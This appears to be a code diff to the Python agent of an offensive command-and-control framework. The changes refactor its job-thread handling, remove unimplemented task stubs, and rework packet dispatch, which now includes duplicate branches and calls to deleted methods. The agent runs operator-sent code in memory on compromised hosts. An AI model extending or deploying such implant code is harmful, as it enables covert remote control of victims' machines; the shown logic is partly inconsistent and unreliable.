@@ -161,14 +161,6 @@ class CFinder(object):
             finder = _meta_cache.pop(repoName)
             sys.meta_path.remove(finder)
 
-
-################################################
-#
-# Socks Server
-#
-################################################
-
-
 ################################################
 #
 # misc methods
@@ -383,7 +375,8 @@ class MainAgent:
         if len(self.tasks) > 0:
             try:
                 for x in self.tasks:
-                    self.tasks[x]['thread'].kill()
+                    self.tasks[x]['task_thread'].kill()
+                    self.tasks[x]['reading_thread'].kill()
             except:
                 # die hard if thread kill fails
                 pass
@@ -533,19 +526,7 @@ class MainAgent:
         self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
         self.tasks[result_id]["status"] = "completed"
 
-    def csharp_execute(self, data, result_id):
-        """
-        Execute C# module in ironpython using reflection
-        Task 116
-        """
-        self.packet_handler.send_message(
-            self.packet_handler.build_response_packet(
-                116, "[!] C# module execution not implemented", result_id
-            )
-        )
-        self.tasks[result_id]["status"] = "unimplemented"
-
-    def job_list(self, result_id):
+    def task_list(self, result_id):
         """
         Return a list of all running agent jobs as a formatted table.
         TODO: Return JSON instead of a table.
@@ -579,14 +560,16 @@ class MainAgent:
         Task 51
         """
         try:
-            if self.tasks[job_to_kill]['thread'].is_alive():
-                self.tasks[job_to_kill]['thread'].kill()
+            if self.tasks[job_to_kill]['task_thread'].is_alive():
+                self.tasks[job_to_kill]['task_thread'].kill()
                 self.tasks[job_to_kill]['status'] = "stopped"
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
                         51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
                     )
                 )
+                if self.tasks[job_to_kill]['reading_thread'].is_alive():
+                    self.tasks[job_to_kill]['reading_thread'].kill()
             else:
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
@@ -603,17 +586,6 @@ class MainAgent:
                 )
             )
             self.tasks[result_id]["status"] = "error"
-
-
-    def start_smb_pipe_server(self, data, result_id):
-        """
-        Start an SMB pipe server on the target.
-        Task 70
-        """
-        self.packet_handler.send_message(
-            self.packet_handler.build_response_packet(70, "[!] SMB server not support in Python agent", result_id)
-        )
-        self.tasks[result_id]["status"] = "unimplemented"
 
     def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
@@ -632,13 +604,13 @@ class MainAgent:
 
         except Exception as e:
             errorData = str(buffer.getvalue())
-            return self.packet_handler.build_response_packet(
+            self.packet_handler.build_response_packet(
                 0,
-                "error executing specified Python data: %s \nBuffer data recovered:\n%s"
+                "error executing TASK_PYTHON_CMD_WAIT: %s \nBuffer data recovered:\n%s"
                 % (e, errorData),
                 result_id,
             )
-        self.tasks[result_id]["status"] = "error"
+            self.tasks[result_id]["status"] = "error"
 
     def dynamic_code_execution_wait_save(self, data, result_id):
         """
@@ -677,7 +649,7 @@ class MainAgent:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
                     0,
-                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    "error executing TASK_PYTHON_CMD_WAIT_SAVE %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
                     result_id,
                 )
@@ -691,7 +663,6 @@ class MainAgent:
         Task 112
         """
         try:
-            result = "[*] Executing script in-memory...\n"
             script_globals = {}
             output_capture = io.StringIO()
             sys.stdout = output_capture
@@ -714,13 +685,12 @@ class MainAgent:
                 self.tasks[result_id]["status"] = "error"
                 return
 
-            result += "[*] Script execution completed successfully.\n"
             captured_output = output_capture.getvalue()
 
             if captured_output:
-                result += "[*] Output from script:\n" + captured_output
+                result = "[*] Output from script:\n" + captured_output
             else:
-                result += "[*] No output captured from the script.\n"
+                result = "[*] No output captured from the script.\n"
 
             if 'output' in script_globals:
                 result += "[*] Output variable from script: \n" + str(script_globals['output'])
@@ -739,26 +709,8 @@ class MainAgent:
             self.tasks[result_id]["status"] = "error"
 
         finally:
-            # Restore the original stdout after execution
             sys.stdout = sys.__stdout__
 
-    def powershell_task(self, data, result_id):
-        """
-        Execute a PowerShell command.
-        Task 102
-        """
-        result_packet = self.packet_handler.build_response_packet(102, "[!] PowerShell tasks not implemented", result_id)
-        self.packet_handler.process_job_tasking(result_packet)
-        self.tasks[result_id]["status"] = "unimplemented"
-
-    def powershell_task_dyanmic_code_wait_nosave(self, data, result_id):
-        """
-        Execute a PowerShell command and wait for the results without saving output.
-        Task 100
-        """
-        result_packet = self.packet_handler.build_response_packet(100, "[!] PowerShell tasks not implemented", result_id)
-        self.packet_handler.process_job_tasking(result_packet)
-        self.tasks[result_id]["status"] = "unimplemented"
 
     def start_python_job(self, code, result_id):
         # create a new code block with a defined method name
@@ -775,7 +727,7 @@ class MainAgent:
         code_thread = KThread(target=self.python_job_func, args=(result_id,))
         code_thread.start()
 
-        self.tasks[result_id]['thread'] = code_thread
+        self.tasks[result_id]['task_thread'] = code_thread
         self.tasks[result_id]["status"] = "running"
 
     def python_job_func(self, result_id):
@@ -1053,7 +1005,8 @@ class MainAgent:
                     "result_id": result_id,
                     "packet_type": packet_type,
                     "status": "started",
-                    "thread": None,
+                    "task_thread": None,
+                    "reading_thread": None,
                     "language": None,
                     "powershell":
                         {
@@ -1110,6 +1063,21 @@ class MainAgent:
             elif packet_type == 70:
                 self.start_smb_pipe_server(data, result_id)
 
+            elif packet_type == 100:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 100:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 101:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 102:
+                self.powershell_task(data, result_id)
+
             elif packet_type == 110:
                 self.dynamic_code_execute_wait_nosave(data, result_id)
 
@@ -1122,36 +1090,19 @@ class MainAgent:
             elif packet_type == 113:
                 self.start_python_job(data, result_id)
 
-            elif packet_type == 102:
-                self.powershell_task(data, result_id)
-
-            elif packet_type == 122:
-                self.csharp_execute(data, result_id)
-
-            elif packet_type == 100:
-                self.powershell_task_dyanmic_code_wait_nosave(data, result_id)
-
-            elif packet_type == 101:
+            elif packet_type == 120:
                 self.tasks[result_id]["status"] = "unimplemented"
                 pass
 
-            elif packet_type == 200:
-                self.script_command(data, result_id)
-
-            elif packet_type == 201:
-                self.script_load(data, result_id)
-
-            elif packet_type == 203:
-                self.view_loaded_modules(data, result_id)
-
-            elif packet_type == 204:
-                self.remove_module(data, result_id)
+            elif packet_type == 122:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
 
             elif packet_type == 220:
                 # Dynamically update agent comms
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        0, "[!] Switch agent comms not implemented", result_id
+                        60, "[!] Switch agent comms not implemented", result_id
                     )
                 )
                 self.tasks[result_id]["status"] = "unimplemented"
@@ -1160,7 +1111,7 @@ class MainAgent:
                 # Update the listener name variable
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        0, "[!] Switch agent comms not implemented", result_id
+                        60, "[!] Switch agent comms not implemented", result_id
                     )
                 )
                 self.tasks[result_id]["status"] = "unimplemented"
